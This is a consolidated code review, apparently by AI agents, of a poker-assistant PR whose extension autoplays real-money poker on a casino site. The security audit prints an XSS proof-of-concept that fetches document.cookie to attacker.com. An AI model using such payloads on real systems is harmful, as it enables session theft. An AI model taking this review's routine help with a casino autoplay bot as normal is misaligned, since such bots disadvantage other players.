# Review: feat/persona-overlay-auto-selection (PR #8)
**Date:** 2026-02-23
**Reviewed by:** security-sentinel, architecture-strategist, pattern-recognition-specialist, performance-oracle, code-simplicity-reviewer

## Consolidated Findings (see todos/ for individual items)

| Todo | Priority | Summary |
|---|---|---|
| 049 | P1 | XSS via unescaped overlay innerHTML (`poker-content.ts:718-738`) |
| 050 | P1 | Persona overlay IPC channel silently broken (cross-origin postMessage) |
| 051 | P1 | Autopilot API error returns HTTP 200, bypasses fallback path |
| 052 | P2 | Dead fields: `alternatives` in SelectedPersona + `reads` in postMessage |
| 053 | P2 | No compile-time safety on persona IDs in SELECTION_MATRIX |
| 054 | P2 | Missing tests: empty-candidates fallback + tight_aggressive rotation |
| 055 | P2 | Missing useMemo in PersonaComparison |
| 056 | P2 | lastPersonaRec not cleared on new hand start |
| 057 | P3 | Delete autopilot-debug route |
| 058 | P3 | Minor simplicity cleanups |

**Merge recommendation: BLOCK** — fix 049 (XSS), 050 (broken IPC), 051 (silent fold on API error) before merging.

---

## Original Agent Findings

---

## Critical Issues

None.

---

## High Priority

- [ ] **Dead field: `reads` sent in postMessage but dropped by `PersonaRec`**
  `extension/src/poker-content.ts:68-72` and `app/page.tsx:124-134`

  `page.tsx` transmits `reads: profile.reads` in the `PERSONA_RECOMMENDATION` message:
  ```ts
  // app/page.tsx:124-134
  window.postMessage({
    source: "poker-assistant-app",
    type: "PERSONA_RECOMMENDATION",
    personaName: selection.persona.name,
    action: selection.action,
    temperature: profile.temperature,
    reads: profile.reads,   // <-- sent
  }, ...);
  ```
  But `PersonaRec` in `poker-content.ts` only stores three fields and never reads `reads`:
  ```ts
  interface PersonaRec {
    name: string;
    action: string;
    temperature: string;
    // reads missing — received, silently dropped
  }
  ```
  The overlay HTML (line 718-726) also never shows a read count. The field is
  transmitted every hand but has no consumer. Either add `reads: number` to
  `PersonaRec` and display it in the overlay, or remove `reads` from the postMessage
  payload.

- [ ] **`alternatives: Persona[]` is populated but never consumed in the UI**
  `lib/poker/persona-selector.ts:17,90-92`, `app/page.tsx:264-267`,
  `components/analyzer/PersonaComparison.tsx`

  `selectPersona()` computes `alternatives` (the unchosen tied candidates) and the
  JSDoc comment says "shown in UI as alternatives". However:
  - `page.tsx` only forwards `selectedPersona?.persona.id` and `selectedPersona?.rotated`
    to `AnalysisResult` — never `selectedPersona?.alternatives`
  - `AnalysisResult.tsx` does not forward `alternatives` to `PersonaComparison`
  - `PersonaComparison.tsx` has no prop for alternatives and renders only a `↻` vs `▶`
    symbol to indicate rotation

  The allocation (`candidates.filter(...).map(r => r.persona)`) runs every hand but
  the result is unreachable from the UI. Either render the alternatives in
  `PersonaComparison.tsx`, or remove the field from the interface, remove the
  computation, and update the JSDoc comment and test assertions accordingly.

---

## Medium Priority

- [ ] **`SELECTION_MATRIX` values typed as `string[]` — no compile-time safety on IDs**
  `lib/poker/persona-selector.ts:32`

  ```ts
  const SELECTION_MATRIX: Record<TableTemperature, string[]> = { ... }
  ```
  A typo such as `"exploit_haw"` would compile without error and silently produce an
  empty candidates list, falling back to GTO Grinder with no warning. Introducing a
  `type PersonaId = "gto_grinder" | "tag_shark" | "lag_assassin" | "exploit_hawk"`
  literal union and typing the matrix as `Record<TableTemperature, PersonaId[]>` would
  catch this at compile time.

- [ ] **`TEMPERATURE_LABELS` typed as `Record<string, string>` instead of `Record<TableTemperature, string>`**
  `components/analyzer/PersonaComparison.tsx:13`

  ```ts
  const TEMPERATURE_LABELS: Record<string, string> = { ... }
  ```
  A missing or misspelled key would silently produce `undefined` at runtime (rendering
  as the string `"undefined"` in the badge). Typing as
  `Record<TableTemperature, string>` (import `TableTemperature` from
  `lib/poker/table-temperature`) would catch any key gaps at compile time.

- [ ] **Missing test: fallback path in `selectPersona` (candidates empty)**
  `lib/poker/__tests__/persona-selector.test.ts`

  The code path at `persona-selector.ts:65-75` fires when
  `getPersonaRecommendations()` returns results that do not include any persona from
  `candidateIds`. This is the "safety fallback: always return GTO Grinder" branch.
  No test exercises it directly. The existing "returns null for unparseable hero
  cards" test covers the `recs === null` case, but not the non-null, zero-candidates
  case. A test like:
  ```ts
  // A hand+position where only tag_shark appears in recs, with tight_passive temp
  // (tight_passive matrix: exploit_hawk + lag_assassin — neither is tag_shark)
  ```
  would need a hand where `exploit_hawk` and `lag_assassin` both FOLD but `tag_shark`
  is the only available candidate, or alternatively the test could mock
  `getPersonaRecommendations` to return a controlled subset.

- [ ] **Missing test: both rotation options reachable for `tight_aggressive`**
  `lib/poker/__tests__/persona-selector.test.ts:65-69`

  The `tight_passive` test (lines 43-52) runs 200 iterations to confirm both
  `exploit_hawk` and `lag_assassin` are reachable. The analogous `tight_aggressive`
  test (lines 65-69) only asserts `rotated === true` and that the result is one of
  `["gto_grinder", "tag_shark"]`, but does not verify both are reachable. If the
  chart for one persona FOLDs AKo at CO, only one candidate would appear and the
  rotation claim would be wrong. Add a 200-iteration reachability test for
  `tight_aggressive`.

- [ ] **`eslint-disable` suppression hides a real stale-closure concern**
  `app/page.tsx:142-143`

  ```ts
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [handState.street]);
  ```
  `handState.heroCards` and `handState.heroPosition` are read inside the effect but
  excluded from deps intentionally, to avoid re-firing mid-street. The stale-closure
  reads happen to be correct (cards/position are set before PREFLOP fires), but this
  is fragile and the suppression gives no hint of the reasoning. A comment explaining
  the deliberate omission would prevent future maintainers from either adding the deps
  (causing incorrect re-fires) or removing the suppression and being confused by the
  lint warning.

---

## Low Priority / Nice-to-Have

- [ ] **`PersonaRec.action` and `.temperature` typed as `string` in content script**
  `extension/src/poker-content.ts:68-72`

  Both fields accept any string. Because this is a content script that cannot import
  from `@/lib/poker`, loose types are understandable. But the `isAutopilotAction`
  type guard pattern already present at lines 106-114 shows that validated message
  handling is valued here. A simple guard for the `PERSONA_RECOMMENDATION` message
  (check that `action` is one of `RAISE|CALL|FOLD`) would be consistent with that
  precedent.

- [ ] **`replace("_", "-")` in overlay replaces only the first underscore**
  `extension/src/poker-content.ts:722`

  ```ts
  lastPersonaRec.temperature.replace("_", "-")
  ```
  String `.replace()` with a string argument replaces only the first occurrence.
  Current `TableTemperature` values all have exactly one underscore, so this works
  by coincidence. `"loose_aggressive"` → `"loose-aggressive"` is correct.
  But `TEMPERATURE_LABELS` in `PersonaComparison.tsx` does the same substitution
  via a lookup dict. The two are divergent approaches to the same transform — one
  fails silently if a new two-underscore temperature is ever added. Use
  `.replaceAll("_", "-")` or a regex `/\_/g` for correctness.

- [ ] **`tableProfile ?? undefined` coercion in page.tsx**
  `app/page.tsx:265`

  ```ts
  tableTemperature={tableProfile ?? undefined}
  ```
  `tableProfile` is `TableProfile | null`. The prop type is `tableTemperature?: TableProfile`
  (undefined-optional). Initialising the state as `useState<TableProfile | undefined>(undefined)`
  instead of `useState<TableProfile | null>(null)` would eliminate the coercion at
  the call site and align the types with the prop contract.

- [ ] **`TYPE_MAP` has no comment linking it to `lib/ai/schema.ts` opponent types**
  `lib/poker/table-temperature.ts:29-34`

  The keys of `TYPE_MAP` (`TIGHT_PASSIVE` etc.) must stay in sync with the
  `inferredType` string values produced by the AI schema. There is no compiler
  enforcement of this link. A comment noting the dependency would prevent a future
  schema rename from silently making all table temperature reads fall through to
  `"balanced"`.

---

## Passed / No Action Needed

- No `any` types introduced in `table-temperature.ts`, `persona-selector.ts`, or the
  new sections of `page.tsx`.
- Injectable `rng` parameter in `selectPersona` — clean testability seam.
- `MIN_READS = 3` constant is named and documented with JSDoc.
- `FALLBACK_ID = "gto_grinder"` constant is named, not hardcoded inline.
- `TYPE_MAP` fallback to `"balanced"` for unrecognised opponent types is a safe
  default for the money context.
- All 4 persona IDs in `SELECTION_MATRIX` (`exploit_hawk`, `lag_assassin`,
  `tag_shark`, `gto_grinder`) match the IDs in `personas.ts`.
- The `rotated` flag threads correctly: `selectPersona` → `SelectedPersona` →
  `page.tsx` → `AnalysisResult` → `PersonaComparison`.
- Dual-street useEffect (PREFLOP vs WAITING) correctly locks persona on hand start
  and clears it on hand end.
- postMessage origin check present in both directions (page.tsx and poker-content.ts).
- `PersonaComparison.tsx` correctly suppresses the temperature badge when temperature
  is `"unknown"`.
- The 200-iteration probabilistic test for `tight_passive` rotation is a good pattern.
- `makeOpponents()` test helper is clean. The strict-majority-boundary test (exactly
  50% = balanced) is a valuable edge case.
- No circular dependencies introduced.
- No TODO/FIXME/HACK comments introduced in the changed files.

---

# Architecture Review (appended 2026-02-23)
**Reviewed by:** Architecture Agent

## Critical Issues

- [ ] **[P1] postMessage IPC channel is architecturally broken for cross-origin deployment**
  `/Users/matthijsbakker/Bakery/poker-assistant/app/page.tsx:124-135`
  `/Users/matthijsbakker/Bakery/poker-assistant/extension/src/poker-content.ts:145-156`

  The content script runs in the Holland Casino poker page context
  (`https://casino.hollandcasino.nl/...`). The Next.js app runs at `localhost:PORT`.
  These are different origins.

  `window.postMessage(..., window.location.origin)` in `page.tsx:134` sets the target
  origin to `localhost:PORT`. The browser silently discards this message without
  delivering it to any window with a different origin — including the poker casino page.
  No event is fired, no error is thrown.

  Even if delivery were attempted, the content script's guard
  `event.origin !== window.location.origin` evaluates to
  `"localhost:PORT" !== "https://casino.hollandcasino.nl"` which is `true`, so the
  guard rejects the message. The two-part source/type filter on lines 147-149 never
  executes.

  The solution doc (`persona-auto-selection-table-temperature.md:207`) states
  "postMessage (same origin) is the correct IPC mechanism" — but this only holds when
  both the app and the content script share an origin, which requires the assistant to
  be loaded in a same-origin iframe on the casino page. In the separately-tabbed
  deployment (Next.js app in one tab, casino table in another), the channel is broken.

  The persona overlay feature in the extension cannot receive recommendations in the
  current architecture. The fix requires either: (a) using `chrome.runtime.sendMessage`
  from the page → background → content script path (requires injecting a bridge script),
  or (b) restructuring so the content script can access session data directly through
  the background script, or (c) documenting that the feature only works in same-origin
  iframe mode.

- [ ] **[P1] Stale closure creates invisible invariant on reducer atomicity**
  `/Users/matthijsbakker/Bakery/poker-assistant/app/page.tsx:103-143`

  The useEffect reads `handState.heroCards` and `handState.heroPosition` from closure
  while declaring only `[handState.street]` in the dependency array. The ESLint
  suppression is mechanically valid today because `useReducer` delivers all state fields
  atomically in one render — heroCards, heroPosition, and street all update in the same
  render when the state machine fires.

  The architectural risk is that correctness is coupled to an undocumented invariant:
  `handState` must remain a single reducer object rather than split into separate
  `useState` atoms. A future refactoring that extracts `heroCards` or `heroPosition`
  into independent state would silently introduce a stale closure bug without producing
  a compile error or a test failure.

  Additionally, the guard `if (handState.heroPosition && heroCardsStr)` at line 114
  means that if position is not yet locked when `street` changes to PREFLOP (possible
  on the first detection frame before position confirmation), persona selection is
  silently skipped with no retry, no fallback, and no indication to the user.

## High Priority

- [ ] **[P2] `selectPersona` null return not handled — stale persona from prior hand persists**
  `/Users/matthijsbakker/Bakery/poker-assistant/app/page.tsx:115-120`

  When `selectPersona` returns null (card parse failure), the `if (selection)` guard
  skips `setSelectedPersona(selection)`. `selectedPersona` retains the previous hand's
  value. The UI shows the prior hand's recommended persona with indigo highlight for
  the entire new hand. `setSelectedPersona(null)` is needed in the null path.

- [ ] **[P2] `FALLBACK_ID` and `SELECTION_MATRIX` use raw string IDs with no compile-time contract**
  `/Users/matthijsbakker/Bakery/poker-assistant/lib/poker/persona-selector.ts:32-43`

  `personas.ts` is auto-generated. If `scripts/generate-charts.ts` renames a persona ID,
  `SELECTION_MATRIX` values and `FALLBACK_ID = "gto_grinder"` silently become stale.
  No type error is emitted. The fallback path returns null rather than the intended GTO
  Grinder persona, and persona selection silently degrades for the affected temperature.
  A `PersonaId` literal union type derived from `PERSONAS` IDs would catch this at
  compile time.

- [ ] **[P2] Auto-generated `personas.ts` has no interface contract protecting consumers**
  `/Users/matthijsbakker/Bakery/poker-assistant/lib/poker/personas.ts:1-7`

  The file is marked "auto-generated — do not edit manually". Both `persona-selector.ts`
  and `persona-lookup.ts` import the `PERSONAS` array and `Persona` type directly with
  no stable intermediary. Persona ID strings and the `PERSONAS` ordering are implicit
  contracts between the generator and its consumers. Any ID rename in the generation
  script breaks the contracts without a compile error.

- [ ] **[P2] `getSession()` in useEffect creates an undocumented temporal dependency**
  `/Users/matthijsbakker/Bakery/poker-assistant/app/page.tsx:109`

  Calling `getSession()` (sessionStorage read) inside the effect bypasses React's data
  flow model. Correctness depends on a temporal ordering guarantee: the prior hand's
  Claude analysis must have written opponent data to sessionStorage before the
  PREFLOP effect fires in the next hand. This is true today because analysis completes
  before the next hand starts. The dependency is enforced by timing alone, not by
  architecture or types, and is not documented in the code.

## Architecture Summary

The two new pure modules (`table-temperature.ts` and `persona-selector.ts`) are the
strongest parts of this PR: pure functions, minimal dependencies, injectable RNG for
testability, and thorough unit tests. These follow the single-responsibility principle
cleanly.

The critical architectural risk is the postMessage IPC channel. As implemented, it
only functions when the poker-assistant app and the casino page share an origin. In
the cross-origin (separate tab) deployment model, the message is silently discarded
before it reaches the content script. The overlay feature is architecturally broken
in the primary deployment scenario.

The stale closure pattern in `page.tsx` works today but creates a hidden invariant
on reducer atomicity that future maintainers are unlikely to be aware of. The
`if (heroPosition && heroCardsStr)` guard adds a silent failure mode when position
is not yet available at the exact frame when the street changes.

Total architecture findings: 6 (2 Critical, 4 High)

---

# Security Audit (appended 2026-02-23)
**Reviewed by:** Security Audit Agent

## Executive Summary

Overall risk rating: **HIGH** — one critical unmitigated XSS in the extension overlay executing on the live poker page DOM, two high-severity issues, and three medium findings. API input validation (Zod schema) is solid. No secrets are hardcoded in tracked files.

---

## CRITICAL

- [ ] **[S-CRITICAL] XSS via unescaped postMessage values in overlay innerHTML**
  `extension/src/poker-content.ts` lines 718–738

  `lastPersonaRec.name`, `lastPersonaRec.action`, and `lastPersonaRec.temperature` are received from `window.postMessage` and interpolated directly into a template literal assigned to `el.innerHTML` with no HTML escaping:

  ```ts
  // lines 720–722
  <span ...>${lastPersonaRec.name}</span>
  <span> → ${lastPersonaRec.action}</span>
  <span> [${lastPersonaRec.temperature.replace("_", "-")}]</span>
  ```

  The origin check at line 146 (`event.origin !== window.location.origin`) rejects cross-origin messages but does NOT protect against injection from the same origin. Any JavaScript running at `localhost` — a supply-chain compromise in an npm dependency, a malicious browser extension injecting into the same origin, or any future XSS in the Next.js app — can send a crafted postMessage and inject arbitrary HTML into the overlay element that lives on the Holland Casino page DOM.

  Proof-of-concept (sendable by any code at same origin):
  ```js
  window.postMessage({
    source: "poker-assistant-app",
    type: "PERSONA_RECOMMENDATION",
    personaName: '<img src=x onerror="fetch(\'https://attacker.com/?c=\'+document.cookie)">',
    action: "RAISE",
    temperature: "balanced"
  }, window.location.origin);
  ```

  The same `el.innerHTML` template at lines 728–738 also interpolates `state.handId`, `state.pot`, and DOM-scraped player name, hand, board, and action strings. A poker player with username `<img src=x onerror=...>` on the platform reaches this injection point through the scraping path.

  Note on practical exploitability: in the current single-developer, local-use scenario, `lastPersonaRec.name` can only be one of four known strings ("GTO Grinder", "TAG Shark", "LAG Assassin", "Exploit Hawk") containing no HTML. This limits the practical attack surface today. It does not eliminate the vulnerability class — the trust boundary is the postMessage channel, not the TypeScript type system.

  **Remediation:** Add an `escapeHtml` helper to the extension and apply it to all values interpolated into `el.innerHTML`:
  ```ts
  function escapeHtml(s: string): string {
    return s
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  }
  ```
  Apply to: `lastPersonaRec.name`, `lastPersonaRec.action`, `lastPersonaRec.temperature`, `state.handId`, `state.pot`, `hero`, `board`, `actions`, `modeLabel`. Alternatively, replace the `el.innerHTML` assignment with structured `document.createElement` + `node.textContent` calls, which are immune to HTML injection by construction.

---

## HIGH

- [ ] **[S-HIGH] API error fallback returns HTTP 200 — bypasses background script's explicit failure path**
  `app/api/autopilot/route.ts` lines 47–53

  When the Claude API throws, the catch block returns `{ action: "FOLD", ... }` with HTTP **200**. The background script's `fetchAutopilotDecision()` (background.ts line 140) calls `sendFallbackAction()` only on non-2xx responses. Because 200 is returned, the error fold is forwarded silently to the real-money DOM executor as a successful Claude decision. The `sendFallbackAction()` logging path — the only place that records a failure reason — is never reached.

  An attacker who can exhaust the Anthropic API quota or trigger sustained rate limiting can force a fold on every hero turn with no indication of failure.

  **Remediation:** Return HTTP 503 on Claude API errors. Update `background.ts:fetchAutopilotDecision()` to call `sendFallbackAction("Claude API error")` on 5xx responses.

- [ ] **[S-HIGH] autopilot-debug route should be deleted, not disabled**
  `app/api/autopilot-debug/route.ts`

  The route currently returns 410 in development and 404 in production. Not exploitable now. Its continued presence creates maintenance risk: a future refactor could re-enable it, and environment-conditional status codes signal unresolved cleanup rather than intentional permanent deprecation.

  **Remediation:** Delete the file entirely. The background.ts AUTOPILOT_DEBUG logging path is the stated replacement.

---

## MEDIUM

- [ ] **[S-MEDIUM] Same-origin postMessage cannot be authenticated — `source` string is not a security primitive**
  `extension/src/poker-content.ts:146-147` and `app/page.tsx:52-53`

  Both listeners correctly reject cross-origin messages and filter on `event.data?.source`. The design limitation is that at the same origin, the `source: "poker-assistant-app"` identifier can be spoofed by any script at `localhost`. The source string provides message routing, not authentication. This is the enabling condition for the Critical XSS above. A comment documenting this constraint would prevent future reviewers from treating it as a security guarantee.

- [ ] **[S-MEDIUM] Hardcoded HTTP localhost URL — no request authentication on autopilot fetch**
  `extension/src/background.ts` line 43: `const AUTOPILOT_API_URL = "http://localhost:3006/api/autopilot";`

  The extension fetches from its own background context so there is no cross-origin injection risk. Operational risks:
  1. Any process listening on port 3006 when the poker-assistant server is not running can receive the `messages` array (containing scraped game state) and return a crafted action JSON, causing the DOM executor to click real-money buttons.
  2. HTTP is unencrypted; any active network inspection tool on the machine can read the messages.

  **Remediation:** Add a shared secret (`AUTOPILOT_SECRET` env var) sent as `X-Extension-Secret` by the extension and validated by `route.ts`.

- [ ] **[S-MEDIUM] /api/autopilot is unauthenticated with no rate limiting**
  `app/api/autopilot/route.ts`

  No API key requirement, no per-IP rate limiting, no CSRF token. Any process that can reach localhost:3006 can call it repeatedly, spending Anthropic API credits. The Zod schema limits per-call cost but does not prevent repeated calls.

  **Remediation:** Validate an `X-Extension-Secret` header. A simple env-var-backed shared secret is sufficient for a local-only tool.

---

## LOW

- [ ] **[S-LOW] `temperature` received via postMessage not validated against TableTemperature union before HTML render**
  `extension/src/poker-content.ts:153` — stored as received, interpolated into innerHTML without escaping or validation.

- [ ] **[S-LOW] `lastPersonaRec` not cleared when a new hand starts**
  `extension/src/poker-content.ts:801` — `lastPersonaRec` is only cleared when autopilotMode is set to "off" (line 702), not when `currentHandId` changes. The overlay shows the prior hand's persona until a fresh `PERSONA_RECOMMENDATION` arrives, potentially misleading a player acting on stale advice.

- [ ] **[S-LOW] `selection.action` not runtime-validated after postMessage boundary**
  `app/page.tsx:129` and `extension/src/poker-content.ts:151` — TypeScript's `"RAISE" | "CALL" | "FOLD"` union does not survive postMessage serialization. No runtime guard confirms the value before it is stored and rendered.

---

## Passed / No Action Needed (security perspective)

- Zod validation on /api/autopilot correctly enforces role enum, content length (max 4000 chars/message), and message count (max 20). No stack traces or internal state in error responses.
- Cross-origin filtering on both postMessage listeners is correct: `event.origin !== window.location.origin`.
- `isAutopilotAction` type guard validates action shape and enum values before DOM executor runs.
- No hardcoded secrets in tracked files. `ANTHROPIC_API_KEY` from `process.env` only. `.env.local` gitignored.
- No SQL injection surface. All persistence is localStorage.
- DOM scraping uses `textContent`/`getAttribute` only. No scraped value reaches `eval` or `document.write`.
- Fallback action chain in background.ts ensures content script always receives a valid action on fetch failure.
- Session token leak from prior PR (todo 034, bodyHTML exfiltration) is resolved in this codebase.

---

## Security Risk Matrix

| ID | Severity | File | Line | Description |
|----|----------|------|------|-------------|
| S1 | CRITICAL | `extension/src/poker-content.ts` | 718–738 | XSS via unescaped postMessage values in innerHTML |
| S2 | HIGH | `app/api/autopilot/route.ts` | 47–53 | API error returns HTTP 200, bypasses background fallback path |
| S3 | HIGH | `app/api/autopilot-debug/route.ts` | — | Dead endpoint file should be deleted |
| S4 | MEDIUM | `poker-content.ts` + `page.tsx` | 146 / 52 | Same-origin postMessage not authenticatable |
| S5 | MEDIUM | `extension/src/background.ts` | 43 | Hardcoded HTTP localhost URL, no request authentication |
| S6 | MEDIUM | `app/api/autopilot/route.ts` | — | Unauthenticated endpoint, no rate limiting |
| S7 | LOW | `extension/src/poker-content.ts` | 153 | `temperature` not validated against union before render |
| S8 | LOW | `extension/src/poker-content.ts` | 801 | `lastPersonaRec` not cleared on new hand start |
| S9 | LOW | `app/page.tsx` | 129 | `action` not runtime-validated after postMessage boundary |
